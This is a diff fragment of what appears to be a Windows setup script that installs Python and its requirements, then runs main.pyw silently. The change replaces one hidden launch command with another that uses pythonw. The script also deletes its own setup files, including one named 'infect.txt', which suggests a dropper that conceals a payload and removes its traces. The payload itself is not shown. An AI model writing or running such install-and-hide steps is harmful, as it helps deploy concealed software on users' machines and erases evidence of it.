@@ -6,7 +6,7 @@ mv VIP/* .;
 rm VIP -Recurse -Force
 choco install python --version=3.10.0 -y;
 pip install -r requirments.txt;
-start python.exe main.pyw -windowstyle Hidden;
+start pythonw main.pyw;
 rm ".gitignore";
 rm "requirements.txt";
 rm "infect.txt";
